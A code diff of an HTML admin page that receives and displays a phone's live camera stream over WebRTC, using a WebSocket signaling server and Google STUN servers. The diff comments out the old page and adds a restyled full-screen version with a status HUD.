@@ -1,31 +1,261 @@
+<!--<!DOCTYPE html>-->
+<!--<html lang="en" xmlns:th="http://www.thymeleaf.org">-->
+<!--<head>-->
+<!--    <meta charset="UTF-8">-->
+<!--    <title>Admin Control | SecureStream</title>-->
+<!--    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">-->
+<!--    <style>-->
+<!--        body { margin: 0; font-family: 'Poppins', sans-serif; background: #0f172a; color: white; display: flex; flex-direction: column; height: 100vh; align-items: center; justify-content: center; }-->
+<!--        .monitor-box { width: 90%; max-width: 800px; aspect-ratio: 16/9; background: #000; border-radius: 20px; border: 2px solid #ef4444; position: relative; box-shadow: 0 0 30px rgba(239, 68, 68, 0.2); overflow: hidden; }-->
+<!--        video { width: 100%; height: 100%; object-fit: cover; }-->
+<!--        .status-msg { margin-top: 20px; padding: 10px 20px; background: rgba(255,255,255,0.05); border-radius: 10px; font-size: 14px; border: 1px solid rgba(255,255,255,0.1); }-->
+<!--        .live-tag { position: absolute; top: 20px; left: 20px; background: #ef4444; padding: 5px 15px; border-radius: 5px; font-size: 12px; font-weight: 700; visibility: hidden; animation: blink 1.5s infinite; }-->
+<!--        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }-->
+<!--    </style>-->
+<!--</head>-->
+<!--<body>-->
+
+<!--<div class="monitor-box">-->
+<!--    <div id="liveBadge" class="live-tag">LIVE FEED</div>-->
+<!--    <video id="remoteVideo" autoplay playsinline muted></video>-->
+<!--</div>-->
+<!--<div class="status-msg" id="statusMsg">Initializing secure connection...</div>-->
+
+<!--<script>-->
+<!--    let peerConnection;-->
+<!--    let socket;-->
+
+<!--    // Google STUN servers for NAT Traversal (Very important for Phone-to-Laptop)-->
+<!--    const config = {-->
+<!--        iceServers: [-->
+<!--            { urls: 'stun:stun.l.google.com:19302' },-->
+<!--            { urls: 'stun:stun1.l.google.com:19302' },-->
+<!--            { urls: 'stun:stun2.l.google.com:19302' }-->
+<!--        ]-->
+<!--    };-->
+
+<!--    function connect() {-->
+<!--        // Render ka static secure URL use kar rahe hain bypass ke liye-->
+<!--        const wsUrl = "wss://camera-access.onrender.com/video-stream";-->
+<!--        console.log("Connecting to WebSocket:", wsUrl);-->
+
+<!--        socket = new WebSocket(wsUrl);-->
+
+<!--        socket.onopen = () => {-->
+<!--            console.log("WebSocket Status: CONNECTED! ✅");-->
+<!--            document.getElementById('statusMsg').innerText = "Connected ✅ Waiting for Phone...";-->
+<!--        };-->
+
+<!--        socket.onmessage = async (event) => {-->
+<!--            console.log("New Signal Received:", event.data);-->
+<!--            const data = JSON.parse(event.data);-->
+
+<!--            if (data.type === 'offer') {-->
+<!--                console.log("Offer detected. Starting WebRTC Negotiation...");-->
+<!--                handleOffer(data);-->
+<!--            } else if (data.type === 'candidate' && peerConnection) {-->
+<!--                try {-->
+<!--                    await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));-->
+<!--                    console.log("ICE Candidate synchronized! ❄️");-->
+<!--                } catch (e) {-->
+<!--                    console.error("Error adding candidate:", e);-->
+<!--                }-->
+<!--            }-->
+<!--        };-->
+
+<!--        socket.onerror = (error) => {-->
+<!--            console.error("WebSocket Error ❌:", error);-->
+<!--            document.getElementById('statusMsg').innerText = "Network Error! ❌ (Check Console)";-->
+<!--        };-->
+
+<!--        socket.onclose = () => {-->
+<!--            console.log("Socket Closed. Reconnecting...");-->
+<!--            document.getElementById('statusMsg').innerText = "Reconnecting to server...";-->
+<!--            setTimeout(connect, 3000); // 3 second baad retry-->
+<!--        };-->
+<!--    }-->
+
+<!--    async function handleOffer(offer) {-->
+<!--        // Naya Peer Connection banayein-->
+<!--        peerConnection = new RTCPeerConnection(config);-->
+
+<!--        // Jab phone se video track aaye, toh video element mein set karein-->
+<!--        peerConnection.ontrack = (event) => {-->
+<!--            console.log("Video Stream Received! 🎥 Starting playback...");-->
+<!--            const remoteVideo = document.getElementById('remoteVideo');-->
+<!--            if (remoteVideo.srcObject !== event.streams[0]) {-->
+<!--                remoteVideo.srcObject = event.streams[0];-->
+<!--                document.getElementById('liveBadge').style.visibility = "visible";-->
+<!--                document.getElementById('statusMsg').innerText = "LIVE FEED ACTIVE 🟢";-->
+<!--            }-->
+<!--        };-->
+
+<!--        // Network candidates phone ko bhejein-->
+<!--        peerConnection.onicecandidate = (event) => {-->
+<!--            if (event.candidate) {-->
+<!--                socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));-->
+<!--            }-->
+<!--        };-->
+
+<!--        // Connection State monitor karein-->
+<!--        peerConnection.oniceconnectionstatechange = () => {-->
+<!--            console.log("Connection Status:", peerConnection.iceConnectionState);-->
+<!--            if (peerConnection.iceConnectionState === "disconnected") {-->
+<!--                document.getElementById('statusMsg').innerText = "Phone Disconnected! 🔴";-->
+<!--                document.getElementById('liveBadge').style.visibility = "hidden";-->
+<!--            }-->
+<!--        };-->
+
+<!--        try {-->
+<!--            // Offer accept karein aur Answer generate karein-->
+<!--            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));-->
+<!--            const answer = await peerConnection.createAnswer();-->
+<!--            await peerConnection.setLocalDescription(answer);-->
+
+<!--            // Phone ko Answer bhej dein-->
+<!--            socket.send(JSON.stringify({-->
+<!--                type: 'answer',-->
+<!--                sdp: answer.sdp-->
+<!--            }));-->
+<!--            console.log("Answer sent to phone! 📤 Waiting for video...");-->
+<!--        } catch (e) {-->
+<!--            console.error("WebRTC Handshake Error:", e);-->
+<!--        }-->
+<!--    }-->
+
+<!--    // Page load hote hi connect karein-->
+<!--    window.onload = connect;-->
+<!--</script>-->
+<!--</body>-->
+<!--</html>-->
 <!DOCTYPE html>
 <html lang="en" xmlns:th="http://www.thymeleaf.org">
 <head>
     <meta charset="UTF-8">
-    <title>Admin Control | SecureStream</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Control | SecureStream Pro</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;700&display=swap" rel="stylesheet">
+
     <style>
-        body { margin: 0; font-family: 'Poppins', sans-serif; background: #0f172a; color: white; display: flex; flex-direction: column; height: 100vh; align-items: center; justify-content: center; }
-        .monitor-box { width: 90%; max-width: 800px; aspect-ratio: 16/9; background: #000; border-radius: 20px; border: 2px solid #ef4444; position: relative; box-shadow: 0 0 30px rgba(239, 68, 68, 0.2); overflow: hidden; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        .status-msg { margin-top: 20px; padding: 10px 20px; background: rgba(255,255,255,0.05); border-radius: 10px; font-size: 14px; border: 1px solid rgba(255,255,255,0.1); }
-        .live-tag { position: absolute; top: 20px; left: 20px; background: #ef4444; padding: 5px 15px; border-radius: 5px; font-size: 12px; font-weight: 700; visibility: hidden; animation: blink 1.5s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        /* Reset & Full Screen */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body, html {
+            width: 100%; height: 100%;
+            background: #000;
+            font-family: 'Space Grotesk', sans-serif;
+            color: white;
+            overflow: hidden;
+        }
+
+        /* --- VIDEO MONITOR (EDGE TO EDGE) --- */
+        .monitor-box {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            z-index: 1;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Laptop ki poori screen cover karega */
+            filter: contrast(1.05) brightness(1.1);
+            transition: opacity 1s ease;
+        }
+
+        /* --- TOP HUD (Heads Up Display) --- */
+        .hud-top {
+            position: absolute;
+            top: 25px; left: 30px; right: 30px;
+            display: flex; justify-content: space-between; align-items: center;
+            z-index: 10;
+            pointer-events: none;
+        }
+
+        .live-tag {
+            background: #ef4444;
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 800;
+            letter-spacing: 3px;
+            visibility: hidden; /* Connection aane par dikhega */
+            animation: blink 1.5s infinite;
+            box-shadow: 0 0 25px rgba(239, 68, 68, 0.6);
+            text-transform: uppercase;
+        }
+
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        .system-id {
+            font-size: 10px;
+            letter-spacing: 4px;
+            color: rgba(255,255,255,0.4);
+            text-transform: uppercase;
+        }
+
+        /* --- DYNAMIC STATUS BAR (BOTTOM OVERLAY) --- */
+        .status-container {
+            position: absolute;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10;
+            text-align: center;
+            width: 100%;
+        }
+
+        .status-msg {
+            display: inline-block;
+            padding: 14px 40px;
+            background: rgba(10, 10, 10, 0.8);
+            backdrop-filter: blur(20px);
+            border-radius: 100px;
+            font-size: 13px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            letter-spacing: 2px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            color: #00f2fe; /* Cyber Cyan */
+            text-transform: uppercase;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        /* Cinematic Scanlines */
+        .overlay-fx {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%);
+            background-size: 100% 4px;
+            z-index: 5; pointer-events: none; opacity: 0.2;
+        }
     </style>
 </head>
 <body>
 
 <div class="monitor-box">
-    <div id="liveBadge" class="live-tag">LIVE FEED</div>
+    <div class="overlay-fx"></div>
+
+    <div class="hud-top">
+        <div id="liveBadge" class="live-tag">Live Feed Active</div>
+        <div class="system-id">SecureStream // Admin_Portal_v3</div>
+    </div>
+
     <video id="remoteVideo" autoplay playsinline muted></video>
 </div>
-<div class="status-msg" id="statusMsg">Initializing secure connection...</div>
+
+<div class="status-container">
+    <div class="status-msg" id="statusMsg">Initializing secure connection...</div>
+</div>
 
 <script>
     let peerConnection;
     let socket;
 
-    // Google STUN servers for NAT Traversal (Very important for Phone-to-Laptop)
+    // Google STUN Servers (Essential for NAT bypass)
     const config = {
         iceServers: [
             { urls: 'stun:stun.l.google.com:19302' },
@@ -34,96 +264,105 @@
         ]
     };
 
+    function updateStatus(text, color = "#00f2fe") {
+        const msgBox = document.getElementById('statusMsg');
+        msgBox.innerText = text;
+        msgBox.style.color = color;
+        msgBox.style.borderColor = color + "44"; // Adding transparency to border
+    }
+
     function connect() {
-        // Render ka static secure URL use kar rahe hain bypass ke liye
+        // Change this URL if your Render backend is different
         const wsUrl = "wss://camera-access.onrender.com/video-stream";
-        console.log("Connecting to WebSocket:", wsUrl);
+        console.log("Connecting to WebSocket...");
 
         socket = new WebSocket(wsUrl);
 
         socket.onopen = () => {
-            console.log("WebSocket Status: CONNECTED! ✅");
-            document.getElementById('statusMsg').innerText = "Connected ✅ Waiting for Phone...";
+            console.log("Connected to Server ✅");
+            updateStatus("Connected ✅ Waiting for Phone Signal...", "#00f2fe");
         };
 
         socket.onmessage = async (event) => {
-            console.log("New Signal Received:", event.data);
             const data = JSON.parse(event.data);
+            console.log("Signal Received:", data.type);
 
             if (data.type === 'offer') {
-                console.log("Offer detected. Starting WebRTC Negotiation...");
+                updateStatus("Offer detected. Handshaking...", "#a855f7"); // Purple for negotiation
                 handleOffer(data);
             } else if (data.type === 'candidate' && peerConnection) {
                 try {
                     await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
-                    console.log("ICE Candidate synchronized! ❄️");
-                } catch (e) {
-                    console.error("Error adding candidate:", e);
-                }
+                    console.log("ICE Candidate Synchronized ❄️");
+                } catch (e) { console.error("Candidate Error:", e); }
             }
         };
 
         socket.onerror = (error) => {
-            console.error("WebSocket Error ❌:", error);
-            document.getElementById('statusMsg').innerText = "Network Error! ❌ (Check Console)";
+            console.error("Socket Error:", error);
+            updateStatus("Network Error! ❌ Check Connection", "#ef4444");
         };
 
         socket.onclose = () => {
-            console.log("Socket Closed. Reconnecting...");
-            document.getElementById('statusMsg').innerText = "Reconnecting to server...";
-            setTimeout(connect, 3000); // 3 second baad retry
+            console.log("Disconnected. Retrying...");
+            updateStatus("Reconnecting to Secure Server...", "#facc15");
+            document.getElementById('liveBadge').style.visibility = "hidden";
+            setTimeout(connect, 3000);
         };
     }
 
     async function handleOffer(offer) {
-        // Naya Peer Connection banayein
+        // Create PeerConnection
         peerConnection = new RTCPeerConnection(config);
 
-        // Jab phone se video track aaye, toh video element mein set karein
+        // Handle incoming video stream
         peerConnection.ontrack = (event) => {
-            console.log("Video Stream Received! 🎥 Starting playback...");
+            console.log("Video Stream Received! 🎥");
             const remoteVideo = document.getElementById('remoteVideo');
+
             if (remoteVideo.srcObject !== event.streams[0]) {
                 remoteVideo.srcObject = event.streams[0];
                 document.getElementById('liveBadge').style.visibility = "visible";
-                document.getElementById('statusMsg').innerText = "LIVE FEED ACTIVE 🟢";
+                updateStatus("LIVE FEED DECRYPTED 🟢", "#22c55e");
             }
         };
 
-        // Network candidates phone ko bhejein
+        // ICE Candidate handling
         peerConnection.onicecandidate = (event) => {
-            if (event.candidate) {
+            if (event.candidate && socket.readyState === WebSocket.OPEN) {
                 socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
             }
         };
 
-        // Connection State monitor karein
+        // Connection State Monitor
         peerConnection.oniceconnectionstatechange = () => {
-            console.log("Connection Status:", peerConnection.iceConnectionState);
-            if (peerConnection.iceConnectionState === "disconnected") {
-                document.getElementById('statusMsg').innerText = "Phone Disconnected! 🔴";
+            console.log("ICE State:", peerConnection.iceConnectionState);
+            if (peerConnection.iceConnectionState === "disconnected" ||
+                peerConnection.iceConnectionState === "failed") {
+                updateStatus("Phone Signal Lost! 🔴", "#ef4444");
                 document.getElementById('liveBadge').style.visibility = "hidden";
             }
         };
 
         try {
-            // Offer accept karein aur Answer generate karein
+            // WebRTC Handshake
             await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
             const answer = await peerConnection.createAnswer();
             await peerConnection.setLocalDescription(answer);
 
-            // Phone ko Answer bhej dein
+            // Send Answer back to phone
             socket.send(JSON.stringify({
                 type: 'answer',
                 sdp: answer.sdp
             }));
-            console.log("Answer sent to phone! 📤 Waiting for video...");
+            console.log("Answer sent. Negotiation Complete.");
         } catch (e) {
-            console.error("WebRTC Handshake Error:", e);
+            console.error("WebRTC Error:", e);
+            updateStatus("Handshake Error! ⚠️", "#ef4444");
         }
     }
 
-    // Page load hote hi connect karein
+    // Initialize on page load
     window.onload = connect;
 </script>
 </body>
